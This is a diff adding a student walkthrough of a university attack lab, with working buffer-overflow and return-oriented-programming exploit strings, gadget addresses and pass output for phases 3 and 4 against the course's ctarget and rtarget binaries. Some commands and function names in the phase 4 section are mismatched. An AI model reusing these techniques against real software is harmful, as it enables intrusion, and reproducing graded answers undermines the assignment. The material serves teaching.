@@ -211,12 +211,119 @@ We should see the following message:
 
 Our goal here is to pass a string as our argument, rather than an address. We know that the string should consist of eight hexadecimal digits without a leading '0x'. We also know that we need to set the $rdi register with our string representation of the cookie. Finally, we know that the strncmp and hexmatch functions are called, they may overwrite portions of memory that held the buffer used by getbuf. Therefore, we shouldn't place our string argument in the buffer memory.
 
-First, we need to create a string representation of our cookie. 
+First, we need to create a string representation of our cookie. To do so, we can use the following tool: 
 
-
-Then, we need to figure out how we can store our cookie after the touch3 return address.
-
+        http://www.unit-conversion.info/texttools/hexadecimal/
         
+Our cookie, $0x2a402507, is converted to the following byte representation: 
+
+        32 61 34 30 32 35 30 37
+
+Then, we need to figure out how we can store our cookie after the touch3 return address. We will put the cookie here in memory because the strncmp and the hexmatch functions will potentially overwrite the buffer space. 
+
+We know we want to return to the stack, since that worked for us before. To do that, we can use the following format: 
+        
+        00 00 00 00 00 00 00 00 00 
+        ...
+        address of stack pointer 
+        ...
+We will want to fill up the buffer, so that we can overwrite the return address of getbuf to the stack. Then, we know we want to be able to access the cookie string, and pass that in to our touch3 function. Finally, we know that we want to be able to put the cookie string below touch3, so that we don't corrupt the data. This means we want to put the address of the cookie string at the top of the stack, so that when we return to it from the getbuf function, it is stored before we move into the touch3 function. 
+
+        address of cookie
+        00 buffer fill
+        00 buffer fill
+        address of stack pointer
+        touch3 address
+        cookie string 
+        
+The last thing we need to do before putting all of the pieces together is to calculate the address of cookie. We know we need 8 bytes for the touch3 address, 8 bytes for the stack pointer address, and 24 bytes for the buffer fill, which means that the address of the cookie string will be rsp + 0x28. We will use our value for the stack pointer from before, '0x55 61 b8 e8', and add the space we need to it, giving us a cookie address of '0x5561B910'. 
+
+Now we have all of the pieces we need to be able to create our solution text file: 
+
+        48 c7 c7 10 b9 61 55 c3 /* move cookie to rsp + 0x18 */
+        00 00 00 00 00 00 00 00 /* padding for buffer = 0x18 = 24 */
+        00 00 00 00 00 00 00 00
+        e8 b8 61 55 00 00 00 00 /* rsp address - stack pointer */
+        cf 15 40 00 00 00 00 00 /* touch3 address - little endian */
+        32 61 34 30 32 35 30 37 /* cookie string */
+        
+Using the same commands as before, we pass the solution to our ctarget and get the completion message: 
+
+        ./hex2raw < phase3.txt > phase3.raw
+        ./ctarget < phase3.raw
+        
+        ./ctarget < phase3.raw
+        Cookie: 0x2a402507
+        Type string:Touch3!: You called touch3("2a402507")
+        Valid solution for level 3 with target ctarget
+        PASS: Sent exploit string to server to be validated.
+        NICE JOB!
+        
+# ROP 
+## Phase 4
+
+The next two phases use what is called return oriented programming to generate the attack. We will be looking for 'gadgets' that allow us to control the program flow, rather than directly using code injection to overflow the buffer. 
+
+We know that our gadgets will be between <start_farm> and <mid_farm> in our disassembled rtarget file. We know that we will only need 2 gadgets, and that our goal is to recreate the attack in phase 2, using the gadgets rather than code injection. Finally, we know that we will need to use a popq instruction.
+
+This means that we need to find two gadgets that allow us to call the target 2 function, and pass the cookie value. 
+
+If we know we need to use the popq instruction, we could use the $rdi register. But, the $rdi byte encoding is not available in our set of gadgets. So we will look for a gadget that captures the $rax (return value) register, encoded as byte 58. 
+
+We notice that the following gadget looks promising: 
+
+
+        0000000000401672 <addval_283>:
+                401672:	8d 87 eb 58 90 90    	lea    -0x6f6fa715(%rdi),%eax
+                401678:	c3                   	retq   
+We want to see 58 at the end of the byte sequence, because we only need the byte 58. We notice that there are two 90 bytes. These encode a nop, or no operation instruction, and do not execute anything. Therefore, this gadget meets our criteria. 
+We note that the byte 58 is the 4th byte in the byte sequence at address 0x401672, so we need to add 3 bytes to the address in order to call the instruction. Therefore, our address for gadget 1 is 0x401672 + 3, giving us 0x401675. 
+
+Our next goal is to find a gadget that allows us to move the return value in to the $rdi register, which is the first argument register. We will need to set this before the touch3 function is called. 
+
+Our assembly would look like this: 
+                
+        popq %rax
+        movq %rax, %rdi
+        ret
+
+We know from the provided resources that the movq $rax, $rdi retq instructions are encoded as 48 89 c7 c3. When searching through the available gadgets, we find one that will work: 
+
+        0000000000401679 <addval_428>:
+                401679:	        8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+                40167f:	        c3                   	retq   
+
+We need the byte sequence starting at 48, so we add two bytes to the address 0x401679 and we get the following address for our second gadget: 
+
+        0x40167b
+        
+Now, we are ready to create our solution. 
+
+We know that we need to overwrite the return address of our getbuf function to be the first in our instructions, popq $rax. We want the return value to be the cookie, so we will store the cookie underneath that instruction. We want the next instruction to be moving the cookie into the argument register, $rdi. Finally, we want to call touch2. 
+
+This gives us the following solution:
+
+        00 00 00 00 00 00 00 00 
+        00 00 00 00 00 00 00 00
+        00 00 00 00 00 00 00 00 /* buffer size */
+        75 16 40 00 00 00 00 00 /* gadget 1: popq rax */
+        07 25 40 2a 00 00 00 00 /* cookie */
+        7b 16 40 00 00 00 00 00 /* gadget 2: movq rax, rdi */
+        b8 14 40 00 00 00 00 00 /* address of touch2 */
+
+We use the same instructions as before, and get the completion message: 
+
+        ./hex2raw < phase3.txt > phase3.raw
+        ./ctarget < phase3.raw
+        
+        ./rtarget <phase4.rawCookie: 0x2a402507
+        Type string:Touch2!: You called touch2(0x2a402507)
+        Valid solution for level 2 with target rtarget
+        PASS: Sent exploit string to server to be validated.
+        NICE JOB!
+        
+## Phase 5
+This phase is a small portion of the final grade, and by far the most complicated. 
 
 
 
